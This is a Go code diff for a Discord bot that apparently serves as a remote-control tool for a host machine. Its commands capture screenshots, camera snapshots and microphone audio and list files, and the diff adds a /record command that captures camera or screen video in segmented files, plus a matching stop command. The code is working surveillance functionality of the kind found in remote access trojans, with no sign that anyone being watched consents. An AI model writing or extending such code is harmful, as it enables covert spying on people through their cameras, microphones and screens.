@@ -30,6 +30,7 @@ func handleInteraction(s *discordgo.Session, i *discordgo.InteractionCreate) {
 				"/screenshot              – capture screenshots of all displays\n" +
 				"/camera                  – capture a snapshot from the default camera\n" +
 				"/mic `[duration]` `[path]` – record from microphone (seconds, optional path)\n" +
+				"/record `<source>`       – record video in segmented files (camera/screen)\n" +
 				"/log `<on|off>`          – stream or stop logs into this channel\n" +
 				"/cwd                     – show current working directory\n" +
 				"/ls `[path]`              – list directory (current or given path)\n" +
@@ -137,6 +138,112 @@ func handleInteraction(s *discordgo.Session, i *discordgo.InteractionCreate) {
 			log.Printf("MIC starting handleMicRecord: channel=%s", i.ChannelID)
 			handleMicRecord(s, i.ChannelID, nil, int(seconds), path)
 			log.Printf("MIC handleMicRecord returned: channel=%s", i.ChannelID)
+		case "record":
+			var source string
+			maxSizeMB := int64(2)
+			maxParts := int64(0)
+			totalMinutes := int64(0)
+			quality := "medium"
+			for _, opt := range data.Options {
+				switch opt.Name {
+				case "source":
+					source = strings.ToLower(opt.StringValue())
+				case "max_size_mb":
+					maxSizeMB = opt.IntValue()
+				case "duration_minutes":
+					totalMinutes = opt.IntValue()
+				case "max_parts":
+					maxParts = opt.IntValue()
+				case "quality":
+					quality = strings.ToLower(opt.StringValue())
+				}
+			}
+			if source != "camera" && source != "screen" {
+				s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
+					Type: discordgo.InteractionResponseChannelMessageWithSource,
+					Data: &discordgo.InteractionResponseData{
+						Content: "Source must be `camera` or `screen`.",
+						Flags:   discordgo.MessageFlagsEphemeral,
+					},
+				})
+				return
+			}
+			if maxSizeMB <= 0 {
+				maxSizeMB = 2
+			}
+			if maxSizeMB > 8 {
+				maxSizeMB = 8
+			}
+			var totalSeconds int64
+			if totalMinutes > 0 {
+				totalSeconds = totalMinutes * 60
+			}
+			if maxParts <= 0 {
+				if totalSeconds > 0 {
+					var estKbps int64
+					switch quality {
+					case "low":
+						estKbps = 400
+					case "high":
+						estKbps = 1500
+					default:
+						estKbps = 800
+					}
+					totalBytes := totalSeconds * (estKbps * 1000 / 8)
+					maxBytes := maxSizeMB * 1024 * 1024
+					if maxBytes <= 0 {
+						maxBytes = 2 * 1024 * 1024
+					}
+					parts := totalBytes / maxBytes
+					if totalBytes%maxBytes != 0 {
+						parts++
+					}
+					if parts <= 0 {
+						parts = 1
+					}
+					if parts > 30 {
+						parts = 30
+					}
+					maxParts = parts
+				} else {
+					maxParts = 5
+				}
+			}
+			if maxParts > 30 {
+				maxParts = 30
+			}
+			if quality != "low" && quality != "medium" && quality != "high" {
+				quality = "medium"
+			}
+			if totalSeconds > 0 && maxParts > 0 {
+				seg := totalSeconds / maxParts
+				if seg < 5 {
+					seg = 5
+				}
+				totalSeconds = seg * maxParts
+			}
+			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
+				Type: discordgo.InteractionResponseChannelMessageWithSource,
+				Data: &discordgo.InteractionResponseData{
+					Content: fmt.Sprintf("🎥 Starting %s recording with max %d MB per file and up to %d parts (%s quality)%s...", source, maxSizeMB, maxParts, quality, func() string {
+						if totalSeconds > 0 {
+							return fmt.Sprintf(" for approximately %d seconds", totalSeconds)
+						}
+						return ""
+					}()),
+					Flags: discordgo.MessageFlagsEphemeral,
+				},
+			})
+			go handleVideoRecord(s, i.ChannelID, nil, source, int(maxSizeMB), int(maxParts), int(totalSeconds), quality)
+		case "recordstop":
+			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
+				Type: discordgo.InteractionResponseChannelMessageWithSource,
+				Data: &discordgo.InteractionResponseData{
+					Content: "Stopping active recording (if any)...",
+					Flags:   discordgo.MessageFlagsEphemeral,
+				},
+			})
+			go handleVideoStop(s, i.ChannelID, nil)
 		case "log":
 			var mode string
 			for _, opt := range data.Options {
